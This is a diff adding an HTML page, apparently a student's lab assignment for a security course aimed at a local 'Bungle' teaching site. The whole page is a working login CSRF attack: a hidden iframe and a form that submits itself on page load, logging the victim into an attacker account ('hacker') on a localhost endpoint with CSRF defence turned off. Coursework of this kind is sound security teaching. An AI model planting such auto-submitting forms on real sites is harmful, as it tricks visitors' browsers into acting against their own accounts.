@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<body>
+
+  <!--Running FIle: file:///Users/dylanramdhan/Documents/Visual%20Studio%20Code/CS%20357/Bungle!/temp1.html-->
+
+  <!--You can be creative on your website design-->
+
+  <!--But the attack below is much more impoartant-->
+  <!--Thinking about the things you wanna hide-->
+  <iframe name="csrf-frame"> </iframe>
+  <form target="csrf-frame" method='POST' action='http://localhost/project2/login?csrfdefense=0&xssdefense=4' id='csrf-form' style=''>
+	  
+    
+    <!--hacker credentials -->
+    <input id="username" name="username" value="hacker">  <!-- username -->
+    <input id="userpass" name="password" value="badguy3"> <!-- password -->
+
+
+  </form>
+
+  <script>
+    document.getElementById("csrf-form").submit()
+  </script>
+
+</body>
+</html>
